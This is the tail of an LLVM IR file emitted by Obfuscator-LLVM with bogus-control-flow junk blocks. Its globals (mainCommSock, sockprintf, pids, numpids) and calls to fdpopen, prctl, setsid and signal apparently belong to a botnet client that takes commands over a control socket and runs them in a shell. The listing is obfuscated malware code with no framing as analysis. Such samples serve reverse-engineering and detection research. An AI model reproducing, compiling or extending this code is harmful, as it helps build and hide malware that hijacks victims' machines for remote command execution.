  %788 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.74, i32 0, i32 0))
  br label %112
                                                  ; No predecessors!
  %790 = load i32, i32* %3, align 4
  ret i32 %790

originalBBalteredBB:                              ; preds = %originalBB, %56
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %73
  %791 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.65, i32 0, i32 0))
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %91
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %118
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %154
  %792 = load i32, i32* %12, align 4
  %_ = shl i32 %792, 1
  %793 = add nsw i32 %792, 1
  store i32 %793, i32* %14, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %178
  %794 = load i32*, i32** @pids, align 8
  %795 = load i32, i32* %14, align 4
  %796 = zext i32 %795 to i64
  %797 = getelementptr inbounds i32, i32* %794, i64 %796
  %798 = load i32, i32* %797, align 4
  %799 = load i32*, i32** @pids, align 8
  %800 = load i32, i32* %14, align 4
  %_19 = sub i32 0, %800
  %gen = add i32 %_19, 1
  %_20 = shl i32 %800, 1
  %_21 = sub i32 0, %800
  %gen22 = add i32 %_21, 1
  %801 = sub i32 %800, 1
  %802 = zext i32 %801 to i64
  %803 = getelementptr inbounds i32, i32* %799, i64 %802
  store i32 %798, i32* %803, align 4
  br label %originalBB18

originalBB26alteredBB:                            ; preds = %originalBB26, %208
  %804 = load i32*, i32** @pids, align 8
  %805 = load i32, i32* %14, align 4
  %_27 = shl i32 %805, 1
  %_28 = sub i32 0, %805
  %gen29 = add i32 %_28, 1
  %806 = sub i32 %805, 1
  %807 = zext i32 %806 to i64
  %808 = getelementptr inbounds i32, i32* %804, i64 %807
  store i32 0, i32* %808, align 4
  %809 = load i64, i64* @numpids, align 8
  %_30 = sub i64 0, %809
  %gen31 = add i64 %_30, -1
  %_32 = shl i64 %809, -1
  %810 = add i64 %809, -1
  store i64 %810, i64* @numpids, align 8
  %811 = load i64, i64* @numpids, align 8
  %_33 = sub i64 0, %811
  %gen34 = add i64 %_33, 1
  %_35 = sub i64 %811, 1
  %gen36 = mul i64 %_35, 1
  %_37 = sub i64 %811, 1
  %gen38 = mul i64 %_37, 1
  %_39 = sub i64 0, %811
  %gen40 = add i64 %_39, 1
  %_41 = sub i64 0, %811
  %gen42 = add i64 %_41, 1
  %_43 = shl i64 %811, 1
  %812 = add i64 %811, 1
  %_44 = shl i64 %812, 4
  %_45 = shl i64 %812, 4
  %813 = mul i64 %812, 4
  %814 = call noalias i8* @malloc(i64 %813) #2
  %815 = bitcast i8* %814 to i32*
  store i32* %815, i32** %13, align 8
  store i32 0, i32* %14, align 4
  br label %originalBB26

originalBB49alteredBB:                            ; preds = %originalBB49, %237
  %816 = load i32, i32* %14, align 4
  %817 = zext i32 %816 to i64
  %818 = load i64, i64* @numpids, align 8
  %819 = icmp ult i64 %817, %818
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %275
  br label %originalBB53

originalBB57alteredBB:                            ; preds = %originalBB57, %304
  %820 = load i32, i32* @mainCommSock, align 4
  %821 = call i32 (i32, i8*, ...) @sockprintf(i32 %820, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.68, i32 0, i32 0))
  br label %originalBB57

originalBB61alteredBB:                            ; preds = %originalBB61, %328
  call void @exit(i32 0) #14
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %354
  %822 = load i8*, i8** %16, align 8
  %823 = load i8, i8* %822, align 1
  %824 = zext i8 %823 to i32
  %825 = icmp ne i32 %824, 32
  br label %originalBB65

originalBB69alteredBB:                            ; preds = %originalBB69, %390
  br label %originalBB69

originalBB73alteredBB:                            ; preds = %originalBB73, %407
  %826 = load i8*, i8** %16, align 8
  store i8 0, i8* %826, align 1
  %827 = load i8*, i8** %15, align 8
  %828 = getelementptr inbounds i8, i8* %827, i64 1
  store i8* %828, i8** %16, align 8
  %829 = load i8*, i8** %15, align 8
  %830 = load i8*, i8** %16, align 8
  %831 = call i64 @strlen(i8* %830) #10
  %832 = getelementptr inbounds i8, i8* %829, i64 %831
  %833 = getelementptr inbounds i8, i8* %832, i64 2
  store i8* %833, i8** %15, align 8
  br label %originalBB73

originalBB77alteredBB:                            ; preds = %originalBB77, %432
  %834 = load i8*, i8** %15, align 8
  %835 = load i8*, i8** %15, align 8
  %836 = call i64 @strlen(i8* %835) #10
  %_78 = sub i64 %836, 1
  %gen79 = mul i64 %_78, 1
  %_80 = sub i64 0, %836
  %gen81 = add i64 %_80, 1
  %_82 = shl i64 %836, 1
  %_83 = sub i64 %836, 1
  %gen84 = mul i64 %_83, 1
  %_85 = sub i64 0, %836
  %gen86 = add i64 %_85, 1
  %837 = sub i64 %836, 1
  %838 = getelementptr inbounds i8, i8* %834, i64 %837
  %839 = load i8, i8* %838, align 1
  %840 = zext i8 %839 to i32
  %841 = icmp eq i32 %840, 10
  br label %originalBB77

originalBB90alteredBB:                            ; preds = %originalBB90, %457
  %842 = load i8*, i8** %15, align 8
  %843 = load i8*, i8** %15, align 8
  %844 = call i64 @strlen(i8* %843) #10
  %_91 = sub i64 0, %844
  %gen92 = add i64 %_91, 1
  %_93 = shl i64 %844, 1
  %845 = sub i64 %844, 1
  %846 = getelementptr inbounds i8, i8* %842, i64 %845
  %847 = load i8, i8* %846, align 1
  %848 = zext i8 %847 to i32
  %849 = icmp eq i32 %848, 13
  br label %originalBB90

originalBB97alteredBB:                            ; preds = %originalBB97, %484
  %850 = load i8*, i8** %15, align 8
  %851 = load i8*, i8** %15, align 8
  %852 = call i64 @strlen(i8* %851) #10
  %_98 = shl i64 %852, 1
  %_99 = sub i64 0, %852
  %gen100 = add i64 %_99, 1
  %_101 = shl i64 %852, 1
  %_102 = shl i64 %852, 1
  %_103 = sub i64 %852, 1
  %gen104 = mul i64 %_103, 1
  %_105 = sub i64 %852, 1
  %gen106 = mul i64 %_105, 1
  %853 = sub i64 %852, 1
  %854 = getelementptr inbounds i8, i8* %850, i64 %853
  store i8 0, i8* %854, align 1
  br label %originalBB97

originalBB110alteredBB:                           ; preds = %originalBB110, %520
  %855 = load i8*, i8** %15, align 8
  %856 = getelementptr inbounds i8, i8* %855, i32 1
  store i8* %856, i8** %15, align 8
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %557
  %857 = load i8*, i8** %17, align 8
  %858 = call i32 @strcmp(i8* %857, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.70, i32 0, i32 0)) #10
  %859 = icmp eq i32 %858, 0
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %580
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %597
  %860 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %860, i8 0, i64 1024, i32 16, i1 false)
  %861 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %862 = load i8*, i8** %15, align 8
  %863 = call i32 (i8*, i8*, ...) @szprintf(i8* %861, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.71, i32 0, i32 0), i8* %862)
  %864 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %865 = call i32 @fdpopen(i8* %864, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.72, i32 0, i32 0))
  store i32 %865, i32* %20, align 4
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %620
  %866 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %867 = load i32, i32* %20, align 4
  %868 = call i8* @fdgets(i8* %866, i32 1024, i32 %867)
  %869 = icmp ne i8* %868, null
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %648
  store i32 1, i32* %22, align 4
  %870 = load i8*, i8** %15, align 8
  %871 = call i8* @strtok(i8* %870, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.73, i32 0, i32 0)) #2
  store i8* %871, i8** %23, align 8
  %872 = load i8*, i8** %17, align 8
  %873 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 0
  store i8* %872, i8** %873, align 16
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %677
  %874 = load i8*, i8** %23, align 8
  %875 = call i64 @strlen(i8* %874) #10
  %_135 = shl i64 %875, 1
  %_136 = shl i64 %875, 1
  %_137 = sub i64 0, %875
  %gen138 = add i64 %_137, 1
  %876 = add i64 %875, 1
  %877 = call noalias i8* @malloc(i64 %876) #2
  %878 = load i32, i32* %22, align 4
  %879 = sext i32 %878 to i64
  %880 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %879
  store i8* %877, i8** %880, align 8
  %881 = load i32, i32* %22, align 4
  %882 = sext i32 %881 to i64
  %883 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %882
  %884 = load i8*, i8** %883, align 8
  %885 = load i8*, i8** %23, align 8
  %886 = call i64 @strlen(i8* %885) #10
  %_139 = sub i64 0, %886
  %gen140 = add i64 %_139, 1
  %_141 = shl i64 %886, 1
  %_142 = shl i64 %886, 1
  %_143 = shl i64 %886, 1
  %_144 = shl i64 %886, 1
  %887 = add i64 %886, 1
  call void @llvm.memset.p0i8.i64(i8* %884, i8 0, i64 %887, i32 1, i1 false)
  %888 = load i32, i32* %22, align 4
  %889 = sext i32 %888 to i64
  %890 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %889
  %891 = load i8*, i8** %890, align 8
  %892 = load i8*, i8** %23, align 8
  %893 = call i8* @strcpy(i8* %891, i8* %892) #2
  %894 = load i32, i32* %22, align 4
  %_145 = sub i32 0, %894
  %gen146 = add i32 %_145, 1
  %_147 = sub i32 %894, 1
  %gen148 = mul i32 %_147, 1
  %_149 = shl i32 %894, 1
  %_150 = sub i32 %894, 1
  %gen151 = mul i32 %_150, 1
  %895 = add nsw i32 %894, 1
  store i32 %895, i32* %22, align 4
  br label %originalBB134

originalBB155alteredBB:                           ; preds = %originalBB155, %723
  store i32 1, i32* %24, align 4
  store i32 1, i32* %24, align 4
  br label %originalBB155

originalBB159alteredBB:                           ; preds = %originalBB159, %740
  %896 = load i32, i32* %24, align 4
  %897 = load i32, i32* %22, align 4
  %898 = icmp slt i32 %896, %897
  br label %originalBB159

originalBB163alteredBB:                           ; preds = %originalBB163, %768
  br label %originalBB163
}

declare i32 @prctl(...) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

declare i32 @sleep(i32) #3

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146612883}
!2 = !{i32 -2146612192}
!3 = !{i32 -2146611443}
!4 = !{i32 -2146610620}
!5 = !{i32 -2146609800}
!6 = !{i32 -2146608456}
!7 = !{i32 -2146607594}
!8 = !{i32 -2146606873}
